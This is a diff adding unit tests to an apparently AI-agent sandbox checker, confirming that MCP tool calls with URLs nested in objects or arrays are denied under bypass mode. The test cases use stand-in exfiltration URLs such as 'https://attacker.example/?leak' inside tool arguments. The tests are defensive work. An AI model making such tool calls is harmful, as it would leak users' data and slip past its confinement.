@@ -422,6 +422,38 @@ describe('evaluateWorkspaceConfinement — MCP write/network fallback (bypass)',
     }
   });
 
+  test('#222: nested- and array-carried URLs are denied (recursion, not just top-level)', () => {
+    // The COMMON real-MCP shapes the top-level-only scan missed: a URL one level
+    // under an object key, inside an array, and nested under `get`/`query`
+    // verbs specifically. All must promote to network and deny under bypass.
+    const cases: Array<[string, unknown]> = [
+      ['mcp__api__get', { params: { url: 'https://attacker.example/?leak' } }],
+      ['mcp__web__query', { targets: ['https://attacker.example/?leak'] }],
+      ['mcp__web__query', { opts: { url: 'https://attacker.example/?leak' } }],
+      [
+        'mcp__docs__get',
+        { request: { method: 'GET', urls: ['https://attacker.example/?leak'] } },
+      ],
+    ];
+    for (const [tool, input] of cases) {
+      const verdict = evaluateWorkspaceConfinement(tool, input, WORKTREE);
+      expect(verdict.denied).toBe(true);
+      expect(verdict.ruleId).toBe(MCP_CONTAINMENT_RULE_ID);
+    }
+  });
+
+  test('#222: a genuinely URL-free nested/array read input is NOT over-promoted', () => {
+    for (const input of [
+      { params: { q: 'select 1', limit: 10 } },
+      { targets: ['docs/readme.md', 'src/app.ts'] },
+      { opts: { nested: { deeper: 'plain string', n: 3 } } },
+    ]) {
+      expect(
+        evaluateWorkspaceConfinement('mcp__web__query', input, WORKTREE).denied,
+      ).toBe(false);
+    }
+  });
+
   test('FAIL-CLOSED: an unknown-capability MCP action is denied (not "other → allowed")', () => {
     // The finding's exact vectors: a `sync`/`process`-style tool matches no
     // read/write/network keyword, so under bypass (no canUseTool prompt) it must be
